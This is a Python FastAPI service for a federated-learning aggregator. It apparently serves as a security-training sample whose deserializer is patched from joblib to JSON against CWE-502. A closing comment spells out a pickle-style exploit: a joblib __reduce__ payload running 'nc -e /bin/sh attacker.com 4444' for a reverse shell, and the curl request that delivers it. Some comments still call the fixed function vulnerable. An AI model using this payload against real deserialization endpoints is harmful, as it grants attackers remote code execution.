import os
import io
import uuid
import base64
import joblib
import sqlite3
import logging
from datetime import datetime
from fastapi import FastAPI, HTTPException, BackgroundTasks
from pydantic import BaseModel
import uvicorn

# Configure logging for the Federated Learning Aggregator
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - FedLearnAgg - %(levelname)s - %(message)s'
)
logger = logging.getLogger("ModelAggregator")

DB_FILE = "federated_learning.db"
app = FastAPI(title="Federated Learning Aggregator API")

def init_tracking_db():
    """Initializes the SQLite database for tracking federated model updates."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE node_contributions (
            contribution_id TEXT PRIMARY KEY,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            node_id TEXT NOT NULL,
            dataset_version TEXT,
            status TEXT NOT NULL,
            remarks TEXT
        )
    ''')
    
    # Pre-populate with mock historical data
    mock_history = [
        ('contrib_001', datetime.now().isoformat(), 'node_alpha', 'v1.0', 'MERGED', 'Valid gradient update.'),
        ('contrib_002', datetime.now().isoformat(), 'node_beta', 'v1.1', 'REJECTED', 'High loss delta.')
    ]
    cursor.executemany('''
        INSERT INTO node_contributions (contribution_id, timestamp, node_id, dataset_version, status, remarks)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("Federated learning tracking database initialized.")

def log_contribution(contrib_id: str, node_id: str, version: str, status: str, remarks: str):
    """Logs the outcome of a node's model contribution."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO node_contributions (contribution_id, node_id, dataset_version, status, remarks) VALUES (?, ?, ?, ?, ?)",
            (contrib_id, node_id, version, status, remarks)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error logging contribution {contrib_id}: {e}")

class ModelUpdateRequest(BaseModel):
    node_id: str
    dataset_version: str
    gradient_payload_b64: str

def deserialize_gradients(payload_b64: str, contrib_id: str):
    """
    SECURE: Uses JSON instead of joblib to prevent Unsafe Deserialization (CWE-502).
    """
    import json
    import base64
    
    logger.info(f"[{contrib_id}] Deserializing secure gradient payload from node.")
    
    try:
        # Secure: We replace the unsafe joblib (pickle-based) module with standard JSON.
        # JSON only parses primitive data structures (like lists of floats) and strictly 
        # prevents arbitrary object instantiation or remote code execution. 
        # Note: For massive production ML workloads, secure binary formats like 
        # 'safetensors' or HDF5 are preferred over JSON for performance reasons.
        raw_bytes = base64.b64decode(payload_b64)
        payload_str = raw_bytes.decode('utf-8')
        
        gradients = json.loads(payload_str)
        
        # Safely validate that the parsed JSON matches the expected structure (e.g., list)
        if isinstance(gradients, list):
            logger.debug(f"[{contrib_id}] Gradients deserialized safely. Element count: {len(gradients)}")
            return gradients
        else:
            logger.warning(f"[{contrib_id}] Deserialized JSON is not a valid gradient list structure.")
            return None
            
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        logger.error(f"[{contrib_id}] Failed to parse payload as JSON: {e}")
        return None
    except base64.binascii.Error as e:
        logger.error(f"[{contrib_id}] Base64 decoding failed: {e}")
        return None
    except Exception as e:
        logger.error(f"[{contrib_id}] Unexpected error processing gradient payload: {e}")
        return None

def process_gradients_background(contrib_id: str, node_id: str, version: str, payload_b64: str):
    """Background task to process the complex gradient aggregation."""
    logger.info(f"[{contrib_id}] Starting background processing for node {node_id}")
    
    # Pass the untrusted, user-provided base64 string directly to the vulnerable function
    gradients = deserialize_gradients(payload_b64, contrib_id)
    
    if gradients is not None:
        # In a real system, we would mathematically aggregate the gradients into the global model here
        logger.info(f"[{contrib_id}] Gradients successfully merged into global model.")
        log_contribution(contrib_id, node_id, version, "MERGED", "Successfully aggregated.")
    else:
        logger.warning(f"[{contrib_id}] Gradient processing failed.")
        log_contribution(contrib_id, node_id, version, "REJECTED", "Deserialization or format error.")

@app.post("/api/v1/federated/contribute")
async def submit_model_update(request: ModelUpdateRequest, background_tasks: BackgroundTasks):
    """Endpoint for federated learning nodes to submit their local model updates."""
    contrib_id = f"contrib_{uuid.uuid4().hex[:8]}"
    
    if not request.gradient_payload_b64:
        raise HTTPException(status_code=400, detail="Missing gradient payload.")
        
    # Queue the heavy deserialization and aggregation task to run in the background
    # to prevent blocking the async FastAPI event loop.
    background_tasks.add_task(
        process_gradients_background,
        contrib_id,
        request.node_id,
        request.dataset_version,
        request.gradient_payload_b64
    )
    
    return {
        "message": "Contribution received and queued for aggregation.",
        "contribution_id": contrib_id,
        "status": "QUEUED"
    }

@app.get("/api/v1/health")
async def health_check():
    """Simple health check endpoint."""
    return {"status": "Federated Aggregator is online and accepting contributions."}

if __name__ == "__main__":
    init_tracking_db()
    
    logger.info("Starting FastAPI Federated Learning Aggregator on port 8000")
    
    # Example Malicious Trigger:
    # 1. Attacker crafts a malicious joblib payload locally:
    #    import joblib, os, base64
    #    class Exploit:
    #        def __reduce__(self):
    #            return (os.system, ('nc -e /bin/sh attacker.com 4444',))
    #    
    #    joblib.dump(Exploit(), 'payload.joblib')
    #    with open('payload.joblib', 'rb') as f:
    #        b64_payload = base64.b64encode(f.read()).decode()
    #
    # 2. Attacker sends the payload to the API via POST:
    #    curl -X POST http://127.0.0.1:8000/api/v1/federated/contribute \
    #         -H "Content-Type: application/json" \
    #         -d '{"node_id": "malicious_node", "dataset_version": "1.0", "gradient_payload_b64": "'$b64_payload'"}'
    
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="warning")
